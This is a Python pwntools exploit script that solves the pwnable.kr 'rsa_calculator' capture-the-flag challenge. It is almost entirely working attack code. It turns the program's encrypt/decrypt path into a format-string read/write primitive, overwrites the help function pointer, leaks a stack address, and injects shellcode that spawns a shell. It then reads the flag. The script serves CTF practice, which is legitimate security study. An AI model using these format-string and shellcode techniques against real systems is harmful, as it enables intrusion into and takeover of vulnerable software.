#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ template template --host pwnable.kr --port 9012 ./rsa_calculator
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF("./rsa_calculator")

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or "pwnable.kr"
port = int(args.PORT or 9012)


def start_local(argv=[], *a, **kw):
    """Execute the target binary locally"""
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


def start_remote(argv=[], *a, **kw):
    """Connect to the process on the remote host"""
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io


def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = """
tbreak main
continue
""".format(
    **locals()
)

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX disabled
# PIE:      No PIE (0x400000)
# RWX:      Has RWX segments

import enum

PLAINTEXT_BUFFER_OFFSET = 0x430

POINTER_SIZE = 8
HELP_FUNCPTR = exe.sym["func"] + 3 * POINTER_SIZE


class MenuChoice(enum.IntEnum):
    SET_KEY_PAIR = 1
    ENCRYPT = 2
    DECRYPT = 3
    HELP = 4
    EXIT = 5


def do_menu(choice: int):
    io.sendlineafter(b"> ", str(choice).encode())


def do_set_key(p: int, q: int, d: int, e: int):
    do_menu(MenuChoice.SET_KEY_PAIR.value)

    io.sendlineafter(b"p : ", str(p).encode())
    io.sendlineafter(b"q : ", str(q).encode())
    io.sendlineafter(b"set public key exponent e : ", str(e).encode())
    io.sendlineafter(b"set private key exponent d : ", str(d).encode())

    io.recvline_startswith(b"prikey")


def do_encrypt(data: bytes) -> bytes:
    do_menu(MenuChoice.ENCRYPT.value)

    io.sendlineafter(b"how long is your data?(max=1024) : ", str(1024).encode())
    io.sendlineafter(b"paste your plain text data\n", data)

    io.recvline()

    return io.recvline(keepends=False)


def do_decrypt(data: bytes) -> bytes:
    do_menu(MenuChoice.DECRYPT.value)

    io.sendlineafter(b"how long is your data?(max=1024) : ", str(1024).encode())
    io.sendlineafter(b"paste your hex encoded data\n", data)

    io.recvline()

    return io.recvline(keepends=False)


def do_format_string(format_: bytes) -> bytes:
    return do_decrypt(do_encrypt(format_))


def read_string(addr: int) -> bytes:
    res = do_format_string(b"%77$s" + b" " * 3 + p64(addr))
    return res[: res.find(b" " * 3)]


def write_byte(addr: int, value: int):
    assert value in range(1 << 8)

    if value >= 8:
        do_format_string(f"%0{value:03}x".encode() + b"%78$hhn" + b" " * 3 + p64(addr))
    else:
        do_format_string(
            b"A" * value + f"%78$hhn".encode() + b" " * (9 - value) + p64(addr)
        )


def write_short(addr: int, value: int):
    assert value in range(1 << 16)

    if value >= 8:
        do_format_string(f"%0{value:05}x".encode() + b"%78$hn" + b" " * 2 + p64(addr))
    else:
        do_format_string(
            b"A" * value + f"%78$hn".encode() + b" " * (10 - value) + p64(addr)
        )


def write_data(addr: int, data: bytes):
    for i, value in enumerate(data):
        write_byte(addr + i, value)


def do_leak_stack() -> int:
    """leaks the saved rbp"""
    return int(do_format_string(b"%206$llx"), 16)


def reset_g_try():
    write_byte(exe.sym["g_try"], 0)


def overwrite_address(where: int, new_addr: int):
    write_data(where, p32(new_addr & 0xFFFFFFFF))
    reset_g_try()
    write_data(where + 4, p32(new_addr >> 32))
    reset_g_try()


io = start()

do_set_key(17, 23, 3, 235)

reset_g_try()

# call main recursively, in order to set rbp to a meaningful value
# so that later we can use it to break ASLR
overwrite_address(HELP_FUNCPTR, exe.sym["main"])
do_menu(MenuChoice.HELP.value)

# leak main's rbp
stack_address = do_leak_stack()

log.success(f"leaked stack address: 0x{stack_address:x}")

plaintext_buffer_address = stack_address - PLAINTEXT_BUFFER_OFFSET

log.info(f"plaintext buffer address: 0x{plaintext_buffer_address:x}")

reset_g_try()

overwrite_address(HELP_FUNCPTR, plaintext_buffer_address)

# write shellcode into stack
do_encrypt(asm(shellcraft.sh()))

do_menu(MenuChoice.HELP.value)  # backdoor!

io.sendline(b"cat flag")
log.success(f"flag = '{term.text.bold_italic_yellow(io.recvline().decode().strip())}'")
